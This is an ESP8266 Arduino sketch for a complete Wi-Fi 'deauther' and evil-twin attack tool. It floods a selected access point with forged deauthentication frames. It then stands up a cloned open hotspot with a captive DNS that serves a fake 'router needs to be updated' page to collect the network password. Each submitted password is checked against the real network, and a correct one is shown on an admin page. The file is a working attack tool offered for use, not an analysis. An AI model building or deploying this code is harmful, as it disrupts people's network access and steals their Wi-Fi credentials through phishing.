#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("M1z23R", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("M1z23R", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

 if (webServer.hasArg("password")) {
  _tryPassword = webServer.arg("password");
  WiFi.disconnect();
  WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
  webServer.send(200, "text/html", "<!DOCTYPE html> <html>  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
} else {
  String htmlContent = "<!DOCTYPE html>"
"<html>"
"<head>"
"  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
"  <style>"
"    body {"
"      font-family: Arial, sans-serif;"
"      background-color: #f0f0f0;"
"    }"
"    .container {"
"      display: flex;"
"      flex-direction: column;"
"      justify-content: center;"
"      align-items: center;"
"      margin-top: 12px;"
"    }"
"    h2 {"
"      color: #00698f;"
"      text-align: center;"
"    }"
"    form {"
"      max-width: 300px;"
"      padding: 44px;"
"      border: 1px solid #ccc;"
"      border-radius: 10px;"
"      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);"
"    }"
"    label {"
"      display: block;"
"      margin-bottom: -4px;"
"      font-weight: 900;"
"    }"
"    input[type=\"text\"] {"
"      width: 93%;"
"      height: 21px;"
"      margin-bottom: 20px;"
"      padding: 10px;"
"      border: 1px solid #ccc;"
"      border-radius: 13px;"
"    }"
"    input[type=\"submit\"] {"
"      width: 105%;"
"      height: 40px;"
"      background-color: #4CAF50;"
"      color: #fff;"
"      padding: 10px;"
"      border: none;"
"      border-radius: 10px;"
"      cursor: pointer;"
"      font-size: 19px;"
"      font-weight: bold;"
"    }"
"    input[type=\"submit\"]:hover {"
"      background-color: #3e8e41;"
"    }"
"    .img-container {"
"      width: 350px;"
"      display: flex;"
"      justify-content: center;"
"      align-items: center;"
"    }"
"    img {"
"      border: none;"
"      border-radius: 39px;"
"      width: 70%;"
"      text-align: center;"
"    }"
"  </style>"
"</head>"
"<body>"
"  <div class=\"container\">"
"    <div class='img-container'>"
"      <img src='data:image/jpeg;base64,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' alt='Router Image'>"
"    </div>"
"    <h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2>"
"    <form action='/'>"
"      <label for='password'>Password:</label><br>"
"      <input type='text' id='password' name='password' value='' minlength='8' required><br>"
"      <input type='submit' value='Submit'>"
"    </form>"
"  </div>"
"</body>"
"</html>";

  webServer.send(200, "text/html", htmlContent);
}



  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}